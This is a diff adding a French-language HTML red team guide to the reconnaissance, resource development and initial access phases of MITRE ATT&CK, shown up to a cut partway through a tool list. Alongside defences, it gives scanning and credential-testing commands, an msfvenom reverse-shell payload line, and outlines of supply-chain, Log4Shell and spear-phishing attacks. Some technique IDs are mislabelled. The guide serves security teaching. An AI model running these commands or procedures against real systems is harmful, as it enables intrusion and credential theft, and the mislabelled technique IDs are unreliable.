@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>RED TEAM — MITRE ATT&CK : Les 3 Premières Phases (Outils, Techniques, Procédures)</title>
+<meta name="description" content="Guide red team interactif et ultra-détaillé des 3 premières tactiques MITRE ATT&CK : Reconnaissance, Développement des ressources, Accès initial. Outils, exemples précis, procédures, défenses.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800;900&family=JetBrains+Mono:wght@400;700&family=Cormorant+Garamond:ital,wght@1,600&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#030814;--surface:#060d1a;--card:#0a1636;--card-hover:#0f214a;--border:#16305c;
+  --text:#e8f4ff;--text-sub:#8aa8d0;--text-dim:#4a7090;--accent:#00ffaa;--accent2:#ff6b35;--accent3:#8a2be2;
+  --danger:#ff2a2a;--warning:#ffaa00;--info:#00d4ff;--success:#00ffaa;
+  --font-body:'Inter',system-ui,sans-serif;--font-mono:'JetBrains Mono',monospace;--font-display:'Cormorant Garamond',serif;
+  --radius:22px;--shadow:0 18px 60px rgba(0,0,0,.75);
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:var(--font-body);background:var(--bg);color:var(--text);line-height:1.7;overflow-x:hidden;min-height:100vh}
+::selection{background:rgba(0,255,170,.22);color:#fff}
+
+/* NAV */
+nav{position:sticky;top:0;z-index:100;background:rgba(3,8,20,.85);backdrop-filter:blur(16px);border-bottom:1px solid rgba(255,255,255,.08);padding:.8rem 2rem;display:flex;gap:1rem;align-items:center;flex-wrap:wrap;justify-content:center}
+nav a{color:var(--text-sub);text-decoration:none;font-weight:700;font-size:.85rem;padding:.35rem .8rem;border-radius:8px;transition:.2s;border:1px solid transparent}
+nav a:hover,nav a.active{color:var(--accent);border-color:rgba(0,255,170,.25);background:rgba(0,255,170,.06)}
+
+/* HERO RED TEAM */
+.hero-red{
+  position:relative;min-height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;
+  overflow:hidden;padding:6rem 2rem;text-align:center;
+  background:
+    radial-gradient(1300px 900px at 20% 30%, rgba(138,43,226,.18) 0%, transparent 55%),
+    radial-gradient(1100px 800px at 80% 70%, rgba(255,107,53,.12) 0%, transparent 55%),
+    radial-gradient(1200px 1000px at 50% 50%, rgba(0,255,170,.1) 0%, transparent 60%),
+    linear-gradient(180deg,#020510 0%,#030814 100%);
+}
+.hero-red::before{
+  content:'';position:absolute;inset:0;pointer-events:none;z-index:0;
+  background-image:
+    linear-gradient(rgba(255,255,255,.03) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(255,255,255,.03) 1px, transparent 1px);
+  background-size:55px 55px;
+}
+.hero-inner{position:relative;z-index:1;max-width:1200px;animation:fadeUp .9s ease-out both}
+@keyframes fadeUp{from{opacity:0;transform:translateY(32px)}to{opacity:1;transform:translateY(0)}}
+.badge-red{
+  display:inline-flex;align-items:center;gap:.6rem;padding:.55rem 1.2rem;border-radius:999px;
+  background:rgba(255,107,53,.12);border:1px solid rgba(255,107,53,.3);color:var(--accent2);font-size:.8rem;font-weight:900;letter-spacing:.12em;text-transform:uppercase;margin-bottom:2rem;
+}
+.badge-red span{display:inline-block;width:8px;height:8px;border-radius:50%;background:var(--accent2);animation:pulse 2s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
+h1{font-family:var(--font-display);font-size:clamp(3rem,9vw,7.5rem);line-height:1.05;letter-spacing:-.05em;font-weight:600;color:#fff;margin-bottom:1.2rem}
+h1 .highlight-red{color:var(--accent);position:relative}
+h1 .highlight-red::after{content:'';position:absolute;bottom:8%;left:-5%;width:110%;height:26%;background:rgba(0,255,170,.15);border-radius:4px;z-index:-1}
+.subtitle-red{font-size:1.25rem;color:var(--text-sub);max-width:720px;margin:0 auto 3.5rem;font-weight:300}
+.cta-row{display:flex;gap:1rem;justify-content:center;flex-wrap:wrap}
+.btn-red{display:inline-flex;align-items:center;gap:.7rem;padding:1rem 2.2rem;border-radius:16px;text-decoration:none;font-weight:900;transition:.2s;border:none;cursor:pointer;font-size:1rem;box-shadow:0 10px 36px rgba(0,255,170,.35)}
+.btn-red-primary{background:linear-gradient(135deg,var(--accent),#00ffaa);color:#030814}
+.btn-red-primary:hover{transform:translateY(-4px);box-shadow:0 18px 50px rgba(0,255,170,.55)}
+.btn-red-secondary{background:rgba(255,255,255,.05);color:#fff;border:1px solid rgba(255,255,255,.15);backdrop-filter:blur(8px)}
+.btn-red-secondary:hover{background:rgba(255,255,255,.1);border-color:rgba(255,255,255,.25)}
+
+/* SECTIONS */
+section{max-width:1280px;margin:0 auto;padding:7rem 1.5rem;position:relative;z-index:2}
+.section-header{text-align:center;margin-bottom:5rem}
+.section-header h2{font-size:2.8rem;font-weight:900;letter-spacing:-.04em;margin-bottom:.8rem}
+.eyebrow{display:inline-block;color:var(--accent);font-weight:900;font-size:.78rem;letter-spacing:.14em;text-transform:uppercase;margin-bottom:.8rem}
+
+/* TIMELINE RED TEAM */
+.timeline-red{position:relative;padding-left:2.5rem;border-left:3px solid rgba(0,255,170,.2);margin:2rem 0 3rem}
+.timeline-red::before{content:'';position:absolute;left:-10px;top:0;width:16px;height:16px;background:var(--accent);border-radius:50%;box-shadow:0 0 0 5px rgba(0,255,170,.2)}
+.timeline-step{position:relative;padding:1.5rem;margin-bottom:2rem;background:linear-gradient(160deg,var(--card),#08183a);border:1px solid var(--border);border-radius:var(--radius);box-shadow:var(--shadow);transition:.2s}
+.timeline-step:hover{transform:translateX(8px);border-color:rgba(0,255,170,.4)}
+.timeline-step h3{font-size:1.35rem;font-weight:800;margin-bottom:.3rem;color:#fff}
+.timeline-step .step-id{font-family:var(--font-mono);font-size:.82rem;color:var(--accent);font-weight:700;margin-bottom:.5rem}
+.timeline-step .step-desc{font-size:1rem;color:var(--text-sub);line-height:1.65;margin-bottom:1rem}
+
+/* TOOL CARDS */
+.tool-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:1.2rem;margin-top:1rem}
+.tool-card{
+  background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.08);border-radius:16px;padding:1.2rem;transition:.2s;position:relative;overflow:hidden;
+}
+.tool-card:hover{background:rgba(255,255,255,.07);border-color:rgba(255,255,255,.18);transform:translateY(-3px);box-shadow:0 12px 30px rgba(0,0,0,.5)}
+.tool-card h4{font-size:1rem;font-weight:800;margin-bottom:.25rem;color:#fff;display:flex;align-items:center;gap:.45rem}
+.tool-card .dot{width:8px;height:8px;border-radius:50%;flex-shrink:0}
+.tool-card p{font-size:.85rem;color:var(--text-sub);line-height:1.55}
+.tool-card .code{font-family:var(--font-mono);font-size:.75rem;color:var(--accent);margin-top:.4rem}
+
+/* INTERACTIVE PROCEDURE */
+.proc-box{background:linear-gradient(160deg,#060f2a,#030814);border:1px solid var(--border);border-radius:var(--radius);padding:2rem;margin:1.5rem 0;position:relative;overflow:hidden}
+.proc-box h3{font-size:1.3rem;font-weight:900;margin-bottom:.3rem}
+.proc-box .proc-num{font-family:var(--font-mono);font-size:.8rem;color:var(--accent2);font-weight:700;margin-bottom:1rem}
+.proc-steps{display:flex;flex-direction:column;gap:.8rem}
+.proc-step{display:flex;gap:1rem;align-items:flex-start;padding:1rem;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:12px;transition:.2s}
+.proc-step:hover{background:rgba(255,255,255,.06);border-color:rgba(255,255,255,.15)}
+.proc-step .num{font-family:var(--font-mono);font-weight:900;font-size:1.2rem;color:var(--accent2);min-width:36px;text-align:center;line-height:1.6;
+  background:rgba(255,107,53,.1);border-radius:8px;padding:.1rem .4rem;flex-shrink:0}
+.proc-step h5{font-weight:800;font-size:1rem;margin-bottom:.15rem;color:#fff}
+.proc-step p{font-size:.88rem;color:var(--text-sub);line-height:1.5}
+
+/* DETAILED TECHNIQUE EXPANDS */
+.detail-block{margin-top:2rem;padding:2rem;background:linear-gradient(160deg,var(--card),#08153a);border:1px solid var(--border);border-radius:var(--radius);box-shadow:var(--shadow)}
+.detail-block h3{font-size:1.5rem;font-weight:900;margin-bottom:.2rem;color:#fff}
+.detail-block .tech-id{font-family:var(--font-mono);color:var(--accent);font-size:.9rem;font-weight:700;margin-bottom:.8rem}
+.detail-block p{font-size:1rem;color:var(--text-sub);line-height:1.7;margin-bottom:1.2rem}
+.detail-block .tag-row{display:flex;flex-wrap:wrap;gap:.4rem;margin-top:1rem}
+.tag{font-size:.72rem;padding:.25rem .55rem;border-radius:999px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);color:var(--text-sub);font-weight:700}
+.tag-red{background:rgba(255,107,53,.12);border-color:rgba(255,107,53,.25);color:var(--accent2)}
+
+/* RED TEAM BADGE */
+.red-badge{display:inline-block;padding:.35rem .8rem;border-radius:8px;background:rgba(255,42,42,.12);border:1px solid rgba(255,42,42,.3);color:var(--danger);font-weight:900;font-size:.75rem;letter-spacing:.08em;text-transform:uppercase;margin-left:.6rem}
+
+/* FOOTER */
+footer{text-align:center;padding:5rem 1.5rem;color:var(--text-dim);font-size:.9rem;border-top:1px solid var(--border);margin-top:6rem;background:#020510}
+
+/* RESPONSIVE */
+@media(max-width:768px){
+  section{padding:4rem 1rem}
+  .timeline-red{padding-left:1.5rem}
+  .proc-step{flex-direction:column;gap:.5rem}
+}
+</style>
+</head>
+<body>
+
+<nav aria-label="Navigation red team">
+  <a href="#recon-phase">TA0043 Reconnaissance</a>
+  <a href="#resource-phase">TA0042 Ressources</a>
+  <a href="#initial-phase">TA0001 Accès</a>
+  <a href="#redteam-tools">Outils Red Team</a>
+</nav>
+
+<!-- HERO -->
+<header class="hero-red" id="top">
+  <div class="hero-inner">
+    <div class="badge-red"><span></span> RED TEAM — MITRE ATT&CK</div>
+    <h1>Les 3 Premières Phases <span class="highlight-red">Complètes</span></h1>
+    <p class="subtitle-red">Guide ultra-interactif et précis : Reconnaissance (TA0043), Développement des Ressources (TA0042), Accès Initial (TA0001). Outils, procédures, techniques, exemples concrets, et tout le détail pour les opérations red team.</p>
+    <div class="cta-row">
+      <a href="#recon-phase" class="btn-red btn-red-primary">Explorer la Reconnaissance</a>
+      <a href="#redteam-tools" class="btn-red btn-red-secondary">Voir tous les outils</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- TA0043 RECON -->
+<section id="recon-phase" aria-label="Phase Reconnaissance Red Team">
+  <div class="section-header">
+    <div class="eyebrow">Phase 1 — TA0043</div>
+    <h2>Reconnaissance <span class="red-badge">RED TEAM</span></h2>
+    <p>Avant de toucher quoi que ce soit : collecte systématique d'informations. Scans, recherches ouvertes, analyse des technologies exposées, identification des cibles humaines.</p>
+  </div>
+
+  <div class="timeline-red">
+    <div class="timeline-step">
+      <h3>T1595 — Scan Actif</h3>
+      <div class="step-id">TA0043 → T1595 | Objectif : Cartographier la surface d'attaque</div>
+      <div class="step-desc">Le red team scanne activement les ports ouverts, les services exposés, et identifie les versions logicielles pour trouver des vulnérabilités exploitables. C'est la base de toute opération.</div>
+      <div class="tool-grid">
+        <div class="tool-card"><h4><span class="dot" style="background:#00ffaa"></span>Nmap</h4><p>Scan de ports TCP/UDP, détection de services et versions. Le standard absolu.</p><div class="code">nmap -sS -sV -O --script vuln target/24</div></div>
+        <div class="tool-card"><h4><span class="dot" style="background:#ff6b35"></span>Masscan</h4><p>Scan ultra-rapide de grands blocs d'IP pour trouver des ports ouverts.</p><div class="code">masscan -p1-65535 10.0.0.0/8 --rate 10000</div></div>
+        <div class="tool-card"><h4><span class="dot" style="background:#8a2be2"></span>Naabu</h4><p>Scan rapide basé sur Go, très efficace pour la reconnaissance rapide.</p><div class="code">naabu -host target.com -top-ports 100</div></div>
+        <div class="tool-card"><h4><span class="dot" style="background:#00d4ff"></span>Shodan</h4><p>Moteur de recherche d'appareils connectés. Permet de trouver des services exposés sans scanner directement.</p><div class="code">host:target.com port:443 product:nginx</div></div>
+      </div>
+    </div>
+
+    <div class="timeline-step">
+      <h3>T1593 — Recherche sur Sites Ouverts</h3>
+      <div class="step-id">TA0043 → T1593 | Objectif : Identifier la surface d'information publique</div>
+      <div class="step-desc">Le red team recherche dans les bases publiques, archives web, réseaux sociaux professionnels, et bases de données de fuites pour identifier des employés, des technologies utilisées, et des informations organisationnelles utiles pour le social engineering.</div>
+      <div class="tool-grid">
+        <div class="tool-card"><h4><span class="dot" style="background:#ffaa00"></span>theHarvester</h4><p>Collecte d'emails, noms d'hôtes et sous-domaines depuis des sources publiques.</p><div class="code">theHarvester -d target.com -l 500 -b google,linkedin</div></div>
+        <div class="tool-card"><h4><span class="dot" style="background:#ff2a2a"></span>Amass</h4><p>Reconnaissance profonde des sous-domaines avec intégration passive et active.</p><div class="code">amass enum -d target.com -passive -o results.txt</div></div>
+        <div class="tool-card"><h4><span class="dot" style="background:#8a2be2"></span>SpiderFoot</h4><p>Automatisation de la collecte d'informations depuis des centaines de sources.</p></div>
+        <div class="tool-card"><h4><span class="dot" style="background:#00ffaa"></span>Maltego</h4><p>Visualisation des relations entre domaines, IPs, personnes et organisations.</p></div>
+      </div>
+    </div>
+
+    <div class="timeline-step">
+      <h3>T1592 — Informations sur la Victime</h3>
+      <div class="step-id">TA0043 → T1592 | Objectif : Profiler l'organisation et ses employés</div>
+      <div class="step-desc">Le red team collecte des données sur l'organisation : structure, technologies utilisées (détectées via headers, certificats SSL), partenaires, et surtout les employés ciblés pour des attaques de social engineering avancées.</div>
+      <div class="tool-grid">
+        <div class="tool-card"><h4><span class="dot" style="background:#00ffaa"></span>Recon-ng</h4><p>Framework de reconnaissance modulaire avec des modules pour collecter des données spécifiques.</p></div>
+        <div class="tool-card"><h4><span class="dot" style="background:#ff6b35"></span>LinkedInt</h4><p>Outil spécialisé dans l'extraction d'informations depuis LinkedIn pour le profilage d'employés.</p></div>
+        <div class="tool-card"><h4><span class="dot" style="background:#00d4ff"></span>GitRob</h4><p>Recherche de fichiers sensibles dans des dépôts Git publics.</p></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- DÉTAIL TECHNIQUE INTERACTIF -->
+  <div class="detail-block" onclick="this.querySelector('.hidden-detail').style.display='block'" style="cursor:pointer;">
+    <h3>T1595 — Scan Actif <span style="font-size:.75rem;color:var(--text-dim);">(Cliquer pour voir le détail technique complet)</span></h3>
+    <div class="tech-id">TA0043 → T1595 → T1595.001 (Scan de ports) / T1595.002 (Recherche active)</div>
+    <p><strong>Définition précise :</strong> L'adversaire effectue un balayage actif du réseau pour identifier des ports ouverts et des services exposés. Cela inclut le scan TCP SYN, UDP, et la détection des versions des services pour identifier des vulnérabilités connues (CVE).</p>
+    <p><strong>Exemple red team concret :</strong> Un opérateur red team lance <code>nmap -p- --min-rate 5000 -oA scan_full target/24</code> pour scanner tout le réseau. Il découvre un service SSH sur le port 2222 avec une version OpenSSH 7.2p2 connue pour avoir des vulnérabilités. Il note cela dans son rapport et passe à l'exploitation.</p>
+    <div class="hidden-detail" style="display:none;margin-top:1rem;padding-top:1rem;border-top:1px solid rgba(255,255,255,.08);">
+      <p><strong>Défense :</strong> Utiliser un IDS/IPS (Snort, Suricata) pour détecter les scans. Mettre en place du rate-limiting au niveau du firewall. Utiliser des ports non standards pour les services administratifs et restreindre l'accès via des VPN ou bastions.</p>
+      <p><strong>Outils de détection :</strong> Fail2Ban, PortSentry, Zeek (IDS), Snort, Suricata.</p>
+    </div>
+  </div>
+</section>
+
+<!-- TA0042 RESSOURCES -->
+<section id="resource-phase" aria-label="Phase Développement des Ressources Red Team">
+  <div class="section-header">
+    <div class="eyebrow">Phase 2 — TA0042</div>
+    <h2>Développement des Ressources <span class="red-badge">RED TEAM</span></h2>
+    <p>Avant l'attaque : préparation complète des capacités. Acquisition d'infrastructure, développement d'outils personnalisés, création de payloads, préparation des canaux C2.</p>
+  </div>
+
+  <div class="timeline-red">
+    <div class="timeline-step">
+      <h3>T1583 — Acquisition d'Infrastructure</h3>
+      <div class="step-id">TA0042 → T1583 | Objectif : Établir l'infrastructure d'attaque</div>
+      <div class="step-desc">Le red team acquiert ou loue des serveurs, achète des domaines, configure des certificats SSL, et met en place des infrastructures de commande et contrôle (C2) qui paraîtront légitimes et résistantes à la détection.</div>
+      <div class="tool-grid">
+        <div class="tool-card"><h4><span class="dot" style="background:#00ffaa"></span>Cobalt Strike</h4><p>Framework C2 commercial très utilisé par les red teams pour simuler des attaques avancées.</p><div class="code">./teamserver [IP] [PASS] [PROFILE]</div></div>
+        <div class="tool-card"><h4><span class="dot" style="background:#ff6b35"></span>Covenant</h4><p>Framework C2 open-source pour .NET, très flexible pour les opérations red team.</p></div>
+        <div class="tool-card"><h4><span class="dot" style="background:#8a2be2"></span>Sliver</h4><p>Framework d'implant C2 open-source en Go, conçu pour la red team moderne.</p></div>
+        <div class="tool-card"><h4><span class="dot" style="background:#00d4ff"></span>Metasploit</h4><p>Framework d'exploitation avec des modules pour générer des payloads et des canaux C2.</p><div class="code">msfvenom -p windows/meterpreter/reverse_https LHOST=X LPORT=443 -f exe -o payload.exe</div></div>
+      </div>
+    </div>
+
+    <div class="timeline-step">
+      <h3>T1588 — Acquisition de Capacités</h3>
+      <div class="step-id">TA0042 → T1588 | Objectif : Développer ou acquérir les outils</div>
+      <div class="step-desc">Le red team développe ou acquiert des exploits, des payloads personnalisés, des outils de post-exploitation, et des scripts d'automatisation adaptés à la cible spécifique et à son environnement.</div>
+      <div class="tool-grid">
+        <div class="tool-card"><h4><span class="dot" style="background:#ffaa00"></span>Mimikatz</h4><p>Extraction de mots de passe, hashes et tickets Kerberos depuis la mémoire.</p></div>
+        <div class="tool-card"><h4><span class="dot" style="background:#ff2a2a"></span>BloodHound</h4><p>Analyse des relations dans Active Directory pour trouver des chemins d'élévation.</p></div>
+        <div class="tool-card"><h4><span class="dot" style="background:#00ffaa"></span>Rubeus</h4><p>Manipulation et abus des tickets Kerberos (AS-REP Roasting, Pass the Ticket).</p></div>
+        <div class="tool-card"><h4><span class="dot" style="background:#8a2be2"></span>Impacket</h4><p>Collection d'outils Python pour manipuler des protocoles Windows (SMB, WMI, Kerberos).</p></div>
+      </div>
+    </div>
+
+    <div class="timeline-step">
+      <h3>T1584 — Compromission d'Infrastructure</h3>
+      <div class="step-id">TA0042 → T1584 | Objectif : Utiliser des infrastructures déjà présentes</div>
+      <div class="step-desc">Le red team utilise des infrastructures existantes (sites légitimes compromis, services cloud publics) pour héberger des payloads ou établir des canaux C2, rendant la détection plus difficile.</div>
+      <div class="proc-box">
+        <h3>Procédure Red Team : Compromission d'une Chaîne d'Approvisionnement</h3>
+        <div class="proc-num">TA0042 → T1584 → T1584.001 (Compromission d'infrastructure)</div>
+        <div class="proc-steps">
+          <div class="proc-step"><div class="num">1</div><h5>Identification</h5><p>Le red team identifie un fournisseur de logiciels ou un service utilisé par la cible.</p></div>
+          <div class="proc-step"><div class="num">2</div><h5>Accès au fournisseur</h5><p>Le red team obtient un accès au système du fournisseur via des failles ou du social engineering.</p></div>
+          <div class="proc-step"><div class="num">3</div><h5>Injection</h5><p>Le payload est injecté dans une mise à jour ou un binaire distribué par le fournisseur.</p></div>
+          <div class="proc-step"><div class="num">4</div><h5>Distribution</h5><p>Le logiciel compromis est distribué aux clients, y compris la cible, via le canal légitime.</p></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="detail-block" onclick="this.querySelector('.hidden-detail').style.display='block'" style="cursor:pointer;">
+    <h3>T1583 — Acquisition d'Infrastructure <span style="font-size:.75rem;color:var(--text-dim);">(Cliquer pour le détail)</span></h3>
+    <div class="tech-id">TA0042 → T1583 → T1583.001 (Domaines) / T1583.002 (Serveurs) / T1583.003 (Machines virtuelles)</div>
+    <p><strong>Définition :</strong> L'adversaire acquiert des domaines, des serveurs ou des machines virtuelles pour soutenir ses opérations. Les domaines sont souvent enregistrés avec des informations de contact anonymes et des extensions peu communes pour éviter la détection.</p>
+    <p><strong>Exemple red team :</strong> Un opérateur achète le domaine <code>microsoft-update[.]net</code> (typo-squatting) et configure un certificat SSL valide via Let's Encrypt. Il héberge un payload qui imite une mise à jour Windows. Le domaine est utilisé dans un email de phishing ciblé.</p>
+    <div class="hidden-detail" style="display:none;margin-top:1rem;padding-top:1rem;border-top:1px solid rgba(255,255,255,.08);">
+      <p><strong>Défense :</strong> Mettre en place un filtrage DNS qui bloque les domaines récents (moins de 30 jours). Utiliser des systèmes de réputation de domaines. Surveiller les enregistrements de domaines similaires au nom de l'organisation (typo-squatting, homographes).</p>
+      <p><strong>Outils de défense :</strong> Quad9 (DNS filtering), OpenDNS, Umbrella, propres listes de blocage.</p>
+    </div>
+  </div>
+</section>
+
+<!-- TA0001 ACCÈS -->
+<section id="initial-phase" aria-label="Phase Accès Initial Red Team">
+  <div class="section-header">
+    <div class="eyebrow">Phase 3 — TA0001</div>
+    <h2>Accès Initial <span class="red-badge">RED TEAM</span></h2>
+    <p>Le moment critique : pénétration dans le réseau ou le système. Phishing avancé, exploitation de vulnérabilités publiques, utilisation de comptes valides, compromission de la chaîne d'approvisionnement.</p>
+  </div>
+
+  <div class="timeline-red">
+    <div class="timeline-step">
+      <h3>T1566 — Phishing</h3>
+      <div class="step-id">TA0001 → T1566 | Objectif : Obtenir un accès via la manipulation</div>
+      <div class="step-desc">Le red team crée et envoie des messages malveillants très ciblés. Cela inclut le spear-phishing (ciblé sur un individu spécifique avec des informations personnelles), le whaling (ciblant des dirigeants), et le phishing par service (utilisation de plateformes légitimes comme Dropbox ou Google Docs).</div>
+      <div class="tool-grid">
+        <div class="tool-card"><h4><span class="dot" style="background:#00ffaa"></span>GoPhish</h4><p>Framework open-source pour créer et gérer des campagnes de phishing simulées.</p><div class="code">./gophish -config config.json</div></div>
+        <div class="tool-card"><h4><span class="dot" style="background:#ff6b35"></span>SET (Social-Engineer Toolkit)</h4><p>Outil avancé pour créer des attaques de social engineering automatisées.</p></div>
+        <div class="tool-card"><h4><span class="dot" style="background:#8a2be2"></span>Evilginx2</h4><p>Framework de phishing avancé avec reverse proxy et capture de cookies/session.</p></div>
+        <div class="tool-card"><h4><span class="dot" style="background:#ffaa00"></span>King Phisher</h4><p>Serveur de phishing avec interface web et collecte de statistiques.</p></div>
+      </div>
+    </div>
+
+    <div class="timeline-step">
+      <h3>T1190 — Exploitation d'Application Publique</h3>
+      <div class="step-id">TA0001 → T1190 | Objectif : Exploiter une vulnérabilité exposée</div>
+      <div class="step-desc">Le red team identifie et exploite des vulnérabilités dans des applications web, des API, ou des services exposés sur Internet. Cela peut inclure des injections SQL, des exécutions de commandes distantes (RCE), ou des failles de désérialisation.</div>
+      <div class="proc-box">
+        <h3>Procédure Red Team : Exploitation d'une Application Publique</h3>
+        <div class="proc-num">TA0001 → T1190 → T1190.001 (Exploitation de vulnérabilité publique)</div>
+        <div class="proc-steps">
+          <div class="proc-step"><div class="num">1</div><h5>Reconnaissance</h5><p>Le red team scanne et identifie une application web exposée (ex : un serveur web avec un CMS non mis à jour).</p></div>
+          <div class="proc-step"><div class="num">2</div><h5>Identification de la vulnérabilité</h5><p>Le red team identifie une CVE connue (ex : CVE-2021-44228 - Log4Shell) applicable au service.</p></div>
+          <div class="proc-step"><div class="num">3</div><h5>Développement du payload</h5><p>Le red team développe un payload spécifique (ex : injection JNDI avec un serveur LDAP contrôlé) pour obtenir un accès initial.</p></div>
+          <div class="proc-step"><div class="num">4</div><h5>Exécution et accès</h5><p>Le payload est envoyé. L'attaquant obtient une session interactive sur le serveur (ex : reverse shell via Netcat ou un agent C2).</p></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="timeline-step">
+      <h3>T1078 — Comptes Valides</h3>
+      <div class="step-id">TA0001 → T1078 | Objectif : Utiliser des identifiants légitimes</div>
+      <div class="step-desc">Le red team utilise des identifiants légitimes déjà volés (via des fuites de données, du phishing, ou des attaques sur des systèmes tiers) pour obtenir un accès initial sans déclencher d'alertes de sécurité liées à des attaques techniques.</div>
+      <div class="tool-grid">
+        <div class="tool-card"><h4><span class="dot" style="background:#00ffaa"></span>CrackMapExec</h4><p>Outil pour tester et utiliser des identifiants sur plusieurs machines en parallèle.</p><div class="code">crackmapexec smb 10.0.0.0/24 -u user -p pass --shares</div></div>
+        <div class="tool-card"><h4><span class="dot" style="background:#ff6b35"></span>Hydra</h4><p>Outil de brute-force rapide pour tester des identifiants sur plusieurs protocoles.</p></div>
+        <div class="tool-card"><h4><span class="dot" style="background:#8a2be2"></span>Patator</h4><p>Outil modulaire de brute-force et de test d'identifiants écrit en Python.</p></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="detail-block" onclick="this.querySelector('.hidden-detail').style.display='block'" style="cursor:pointer;">
+    <h3>T1566 — Phishing <span style="font-size:.75rem;color:var(--text-dim);">(Cliquer pour le détail complet red team)</span></h3>
+    <div class="tech-id">TA0001 → T1566 → T1566.001 (Spearphishing avec pièce jointe) / T1566.002 (Spearphishing avec lien)</div>
+    <p><strong>Définition précise :</strong> L'adversaire envoie des messages ciblés pour obtenir des informations sensibles ou un accès. Le spear-phishing est hautement personnalisé : il utilise des informations spécifiques sur la victime (nom, poste, projets en cours, relations professionnelles) pour créer un message crédible.</p>
+    <p><strong>Exemple red team avancé :</strong> Le red team découvre via LinkedIn qu'un employé travaille sur un projet "Projet Alpha" avec un partenaire externe. Il enregistre un domaine similaire au partenaire (<code>partenaire-alpha[.]com</code> au lieu de <code>partenairealpha.com</code>) et envoie un email depuis une adresse similaire au responsable du partenaire. L'email contient un lien vers un document "Projet Alpha - Mise à jour" hébergé sur le site contrôlé. Quand la victime clique, un payload est téléchargé et exécuté.</p>
+    <div class="hidden-detail" style="display:none;margin-top:1rem;padding-top:1rem;border-top:1px solid rgba(255,255,255,.08);">
+      <p><strong>Détail technique du payload :</strong> Le red team utilise souvent un document Office avec une macro malveillante (T1204 - User Execution) qui lance un script PowerShell encodé. Le script PowerShell télécharge un agent C2 (ex : Cobalt Strike Beacon) depuis le serveur contrôlé et établit un canal de communication chiffré.</p>
+      <p><strong>Défense :</strong> Formation régulière au phishing avec des campagnes simulées. Mise en place de filtres anti-phishing avancés. Désactivation des macros par défaut. Surveillance des processus enfants inhabituels (Word → PowerShell → réseau). Utilisation de solutions EDR avec analyse comportementale.</p>
+      <p><strong>Outils de détection :</strong> Microsoft Defender for Office 365, Proofpoint, Mimecast, EDR (CrowdStrike, SentinelOne).</p>
+    </div>
+  </div>
+</section>
+
+<!-- OUTILS RED TEAM -->
+<section id="redteam-tools" aria-label="Outils Red Team Complets">
+  <div class="section-header">
+    <div class="eyebrow">Arsenal</div>
+    <h2>Tous les Outils Red Team <span class="red-badge">COMPLET</span></h2>
+    <p>Liste exhaustive des outils utilisés dans chaque phase, avec leurs fonctions spécifiques et leurs alternatives open-source ou commerciales.</p>
+  </div>
+
+  <div class="proc-box">
+    <h3>Arsenal Complet par Phase</h3>
+    <div class="proc-num">TA0043 (Recon) → TA0042 (Ressources) → TA0001 (Accès) — Tout l'arsenal</div>
+    <div class="proc-steps">
+      <div class="proc-step"><h5>Reconnaissance Active</h5><p>Nmap, Masscan, Naabu, Shodan, Amass, theHarvester, Recon-ng, Maltego, SpiderFoot</p></div>
+      <div class="proc-step"><h5>Développement Ressources</h5><p>Cobalt Strike, Covenant, Sliver, Metasploit, Mimikatz, BloodHound, Rubeus, Impacket</p></div>
+      <div class="proc-step"><h5>Accès Initial</h5><p>GoPhish, SET, Evilginx2, King Phisher, CrackMapExec, Hydra, Patator</p></div>
+      <div class="proc-step"><h5>Post-Exploitation</h5><p>Mimikatz, BloodHound, PowerView, SharpHound, Rubeus, Seatbelt, SharpUp</p></div>
+    </div>
+  </div>
+
+  <div class="timeline-red" style="margin-top:3rem;">
+    <h3 style="font-size:1.5rem;font-weight:900;margin-bottom:1.5rem;">Outils Spécialisés et Alternatives</h3>
+    <div class="timeline-step">
+      <h4>C2 et Post-Exploitation</h4>
+      <div class="step-desc">Pour maintenir l'accès et contrôler le système après la pénétration initiale.</div>
+      <div class="tool-grid">
+        <div class="tool-card"><h4><span class="dot" style="background:#00ffaa"></span>Cobalt Strike</h4><p>Commercial. Beacon (agent léger), Malleable C2 (profil C2 personnalisable), Aggressor Scripts (automatisation). Le standard red team.</p><div class="code">teamserver IP PASS [PROFILE]</div></div>
+        <div class="tool-card"><h4><span class="dot" style="background:#ff6b35"></span>Sliver</h4><p>Open-source. Framework C2 en Go avec implant multi-plateforme et protocole de communication personnalisable.</p></div>
+        <div class="tool-card"><h4><span class="dot" style="background:#8a2be2"></span>Havoc</h4><p>Open-source. Alternative à Cobalt Strike avec interface graphique et fonctionnalités avancées.</p></div>
+        <div class="tool-card"><h4><span class="dot" style="background:#00d4ff"></span>Pwn3r</h4><p>Open-source. Framework d'exploitation et post-exploitation avec des modules intégrés.</p></div>
+      </div>
+    </div>
+
+    <div class="timeline-step">
+      <h4>Reconnaissance et OSINT</h4>
+      <div class="step-desc">Pour collecter des informations avant et pendant l'opération.</div>
+      <div class="tool-grid">
+        <div class="tool-card"><h4><span class="dot" style="background:#ffaa00"></span>OSINT Framework</h4><p>Collection structurée d'outils OSINT organisés par catégorie (personnes, domaines, IPs, etc.).</p></div>
+        <div class="tool-card"><h4><span class="dot" style="background:#ff2a2a"></span>Sherlock</h4><p>Recherche d'utilisateurs sur plus de 300 plateformes de réseaux sociaux.</p></div>
+        <div class="tool-card"><h4><span class="dot" style="background:#00ffaa"></span>Holehe</h4><p>Recherche de comptes associés à une adresse email sur plusieurs plateformes.</p></div>
